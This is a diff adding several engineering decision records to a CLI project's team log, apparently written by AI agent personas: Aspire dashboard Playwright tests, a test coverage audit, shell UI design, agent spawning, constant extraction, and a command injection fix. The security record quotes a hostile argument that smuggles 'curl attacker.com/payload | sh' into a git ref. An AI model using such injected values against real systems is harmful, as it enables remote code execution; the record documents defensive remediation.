@@ -1762,3 +1762,207 @@ If no `TracerProvider` / `MeterProvider` is registered, `@opentelemetry/api` ret
 **By:** Brady (via Copilot)
 **What:** Integration tests must launch the Aspire dashboard and validate that OTel telemetry shows up in it. Use Playwright for browser-based validation. Use the very latest Aspire bits. Reference aspire.dev for documentation, NOT learn.microsoft.com. It's "Aspire" not ".NET Aspire" — get that right in all documentation.
 **Why:** User request — captured for team memory
+
+# Decision: Aspire Dashboard Playwright Integration Tests
+
+**By:** Saul (Aspire & Observability)
+**Date:** 2026-02-22
+**Requested by:** Brady
+
+## What
+
+Created `test/aspire-integration.test.ts` — a Playwright + Vitest integration test suite that:
+
+1. Launches the Aspire dashboard container (`mcr.microsoft.com/dotnet/aspire-dashboard:latest`)
+2. Configures OTel gRPC export via `@opentelemetry/sdk-node` + `@opentelemetry/exporter-trace-otlp-grpc`
+3. Creates Squad-style spans and metrics (session traces, agent traces, counters, histograms)
+4. Opens Playwright Chromium browser to the dashboard and validates telemetry appears
+5. Tests `squad aspire` command lifecycle (runAspire export, AspireOptions interface, Docker container state)
+
+## 5 Tests
+
+| Test | What it validates |
+|------|-------------------|
+| traces appear in Aspire dashboard | Span creation → gRPC export → dashboard /traces page renders trace data |
+| metrics appear in Aspire dashboard | Counter/histogram recording → gRPC export → dashboard /metrics page renders metric data |
+| squad aspire command exists | `runAspire` is exported from `@bradygaster/squad-cli/commands/aspire` |
+| AspireOptions with docker flag | Type-level: `{ docker: true, port: 18888 }` compiles |
+| Docker lifecycle | Container running, dashboard port 18888 responds, OTLP gRPC port 4317 accepts TCP connections |
+
+## Technical Choices
+
+- **NodeSDK (0.57.2)** over BasicTracerProvider (2.x): Version alignment with gRPC exporters (also 0.57.2) avoids type mismatch
+- **Direct URL navigation** over sidebar clicks: Aspire's Fluent UI web components don't match standard selectors reliably
+- **Skip guard**: `SKIP_DOCKER_TESTS=1` env var or Docker absence auto-skips the suite — safe for CI without Docker
+
+## Verification
+
+- All 5 tests pass (traces 4.8s, metrics 6.8s, command tests <100ms each)
+- Full suite: 2141 tests passing across 79 files
+- Build clean, type-check clean
+
+
+# Decision: Coverage Gap Audit — 114 New Tests
+
+**By:** Hockney (Tester)
+**Date:** 2026-02-23
+**Status:** Implemented
+
+## What
+
+Created 4 new test files covering critical test gaps identified in audit:
+
+1. **`test/shell-integration.test.ts`** (32 tests) — Shell startup lifecycle, input routing (parseInput), coordinator response parsing (ROUTE/DIRECT/MULTI), session cleanup, graceful degradation when SDK disconnected.
+2. **`test/health.test.ts`** (17 tests) — HealthMonitor.check() success/timeout/degraded cases, getStatus() passive checks, diagnostics logging toggle.
+3. **`test/model-fallback.test.ts`** (25 tests) — Cross-tier fallback chain exhaustion, tier ceiling enforcement (fast never escalates to premium), provider preference reordering ("use Claude" stays in Claude family), nuclear fallback (all models exhausted → null).
+4. **`test/cli/upstream-clone.test.ts`** (40 tests) — Git ref validation (14 injection vectors rejected), upstream name validation, source type detection, git clone arg construction, failure recovery messages, file I/O round-trips, gitignore idempotency.
+
+## Why
+
+Audit identified these as the highest-risk untested paths. Shell integration had zero tests for the end-to-end lifecycle. HealthMonitor had no tests at all. Model fallback had catalog tests but no chain-walk or tier-ceiling tests. Upstream git clone had resolver tests but no validation or error recovery tests.
+
+## Impact
+
+- Test count: 2022 → 2136 (114 new tests, +5.6%)
+- Test files: 74 → 78 (4 new files)
+- Zero regressions — all 2136 tests pass
+- No existing test files modified
+
+## Constraints Respected
+
+- Vitest patterns throughout (describe/it/expect/vi.mock/vi.fn)
+- Mock SDK client for health tests — no real Copilot connection
+- New test files only — no modifications to existing 74 test files
+- Exceeds minimum target of 50 new tests (delivered 114)
+
+
+# Decision: REPL Shell Polish Architecture
+
+**By:** Fortier
+**Date:** 2026-02-22
+**Scope:** Shell UI components (`App.tsx`, `AgentPanel.tsx`, `MessageStream.tsx`, `InputPrompt.tsx`, `lifecycle.ts`)
+
+## What
+
+Role emoji mapping and welcome data loading live in `lifecycle.ts` alongside team manifest parsing. UI components import directly from `../lifecycle.js` — no new props needed on the shell entry point (`index.ts`). All filesystem reads happen inside React `useEffect` hooks at mount time.
+
+## Why
+
+- **Single source of team data**: `lifecycle.ts` already owns `parseTeamManifest()`. Adding `getRoleEmoji()` and `loadWelcomeData()` here keeps all team-data concerns in one module. Components don't need to know about `.squad/` directory structure.
+- **No SDK wiring changes**: Loading welcome data inside `App.tsx` via `useEffect` avoids any changes to `index.ts` and the coordinator/session wiring. The welcome screen is purely additive UI.
+- **Fail-safe**: `loadWelcomeData()` returns `null` on any error. Components gracefully degrade — if `.squad/team.md` or `.squad/identity/now.md` is missing, the header still shows version and hints.
+
+## Team Impact
+
+- **Component authors**: `AgentPanel` now accepts optional `streamingContent` prop; `MessageStream` accepts optional `agents` and `processing` props. Both are backward-compatible (props are optional with defaults).
+- **Role emoji map**: New roles should be added to the `map` in `getRoleEmoji()` in `lifecycle.ts`. Unknown roles get `🔹` fallback.
+- **ThinkingIndicator**: 80ms `setInterval` runs only while the indicator is mounted. Cleanup is automatic via React effect teardown. No event loop concerns.
+
+
+### 2026-02-22: spawn.ts wired to SquadClient — self-contained agent spawning
+**By:** Fenster (Core Dev)
+**Status:** IMPLEMENTED
+
+**What:** `spawnAgent()` in `packages/squad-cli/src/cli/shell/spawn.ts` now accepts an optional `client: SquadClient` via `SpawnOptions`. When a client is provided, it creates a real SDK session (streaming, system prompt from charter, working directory), sends the task message, accumulates streamed `message_delta` events, closes the session, and returns the full response in `SpawnResult`.
+
+**Why:** Phase 3 blocker — spawn was a stub returning a placeholder string. Now it's a working SDK integration that can be used from the Ink shell, coordinator, CLI commands, or any programmatic consumer.
+
+**Design decisions:**
+1. **Client via options, not parameter** — Adding `client` to `SpawnOptions` instead of a positional parameter preserves backward compatibility. Callers that don't provide a client get a graceful stub.
+2. **Self-contained, no shell dependency** — Unlike `dispatchToAgent()` in shell/index.ts which wires into Ink state (ShellApi, StreamBridge), spawn.ts owns its own session lifecycle. This makes it usable outside the shell.
+3. **Session-per-spawn** — Each spawn creates and closes its own session. This is intentional for isolation. Long-lived sessions can be managed externally and passed via a future `session` option if needed.
+
+**Error handling audit (same PR):**
+- `plugin.ts`: Removed unused `error` import from output.ts (was dead code, `fatal()` from errors.ts already used correctly).
+- `upgrade.ts`: Removed unused `error as errorMsg` import from output.ts (same pattern).
+- `upstream.ts`: Has `import { error as fatal } from output.ts` bug — **not touched** (Baer owns it).
+- **Convention:** For CLI-exiting errors, use `fatal()` from `cli/core/errors.ts` (throws `SquadError`, returns `never`). For non-fatal operational warnings, `error()` from `output.ts` is fine.
+
+**Files changed:**
+- `packages/squad-cli/src/cli/shell/spawn.ts` — Rewired spawnAgent, added client/teamRoot to SpawnOptions
+- `packages/squad-cli/src/cli/commands/plugin.ts` — Removed unused error import
+- `packages/squad-cli/src/cli/core/upgrade.ts` — Removed unused errorMsg import
+
+**Build:** Clean (0 errors). **Tests:** 47 shell tests passing.
+
+
+# Decision: Extract hardcoded values to central constants
+
+**Author:** Edie (TypeScript Engineer)
+**Date:** 2026-02-22
+**Status:** Implemented
+
+## Context
+
+The code audit found model names, timeouts, and role mappings duplicated across 6+ files. Values had already drifted — e.g., `model-selector.ts` had 4-entry fallback chains while `config.ts` and `init.ts` had 3-entry chains with different models. This violated single-source-of-truth and created silent inconsistency risk.
+
+## Decision
+
+Created `packages/squad-sdk/src/runtime/constants.ts` as the canonical source for:
+
+- **`MODELS`** — `DEFAULT`, `SELECTOR_DEFAULT`, `SELECTOR_DEFAULT_TIER`, `FALLBACK_CHAINS` (3 tiers × 4 models each), `NUCLEAR_FALLBACK`, `NUCLEAR_MAX_RETRIES`. All `as const`.
+- **`TIMEOUTS`** — `HEALTH_CHECK_MS` (5000), `GIT_CLONE_MS` (60000), `PLUGIN_FETCH_MS` (15000). All env-overridable via `parseInt(process.env[...] ?? default, 10)`.
+- **`AGENT_ROLES`** — `readonly` tuple deriving `AgentRole` type.
+
+## Files updated
+
+| File | Change |
+|------|--------|
+| `runtime/constants.ts` | **Created** — single source of truth |
+| `agents/model-selector.ts` | Removed local `FALLBACK_CHAINS`, `DEFAULT_MODEL`, `DEFAULT_TIER`; imports from constants |
+| `runtime/config.ts` | `DEFAULT_CONFIG` uses `MODELS.*`; `AgentRole` re-exported from constants |
+| `runtime/health.ts` | Default timeout uses `TIMEOUTS.HEALTH_CHECK_MS` |
+| `config/init.ts` | Template generators use `MODELS.*` for all model values |
+| `cli/commands/plugin.ts` | Browse timeout uses `TIMEOUTS.PLUGIN_FETCH_MS` |
+| `index.ts` | Named exports: `MODELS`, `TIMEOUTS`, `AGENT_ROLES` |
+| `package.json` | Added `./runtime/constants` subpath export |
+
+**Not touched:** `upstream.ts` (Baer owns), `benchmarks.ts` (synthetic simulation data, not config).
+
+## Rationale
+
+- `as const` gives literal types + `readonly` — prevents accidental mutation
+- Environment variable overrides enable runtime configuration without code changes
+- Named exports (not `export *`) from barrel avoid `AgentRole` collision with casting module's different `AgentRole` type
+- Spreading `[...MODELS.FALLBACK_CHAINS.tier]` converts readonly tuples to mutable arrays for interface compatibility
+
+## Verification
+
+- Build: zero TypeScript errors
+- Tests: 2138/2141 passed (3 failures are pre-existing Docker/Aspire infrastructure tests)
+
+
+# Decision: Fix CWE-78 Command Injection in upstream.ts
+
+**Date:** 2026-02-22
+**Author:** Baer (Security)
+**Requested by:** Brady
+**Status:** IMPLEMENTED
+
+## Context
+
+Security audit of `packages/squad-cli/src/cli/commands/upstream.ts` identified 3 CWE-78 (OS Command Injection) vulnerabilities. All three used `execSync` with string interpolation, allowing shell metacharacters in user-supplied `--ref`, `--name`, and source arguments to execute arbitrary commands.
+
+**Attack example:** `squad upstream add https://repo --ref "main && curl attacker.com/payload | sh"`
+
+## Changes Made
+
+1. **Replaced `execSync` → `execFileSync` with array arguments** (3 call sites: add-clone, sync-pull, sync-clone). `execFileSync` bypasses the shell entirely — arguments are passed directly to the `git` binary.
+
+2. **Added input validation functions:**
+   - `isValidGitRef(ref)` — allows only `[a-zA-Z0-9._\-/]+`
+   - `isValidUpstreamName(name)` — allows only `[a-zA-Z0-9._-]+`
+   - Both reject shell metacharacters (`&`, `|`, `;`, backticks, `$`, etc.)
+
+3. **Fixed `fatal` import:** Changed from `error as fatal` (output.js — prints but continues) to real `fatal` (errors.js — throws SquadError, exits). Usage-error paths now properly halt execution.
+
+## Verification
+
+- `npm run build` — passes (0 errors)
+- `npm test` — 74 test files, 2022 tests passed
+
+## Risk Assessment
+
+- **Before:** Critical — unauthenticated RCE via CLI argument injection
+- **After:** Mitigated — defense in depth (no shell + input validation)
+
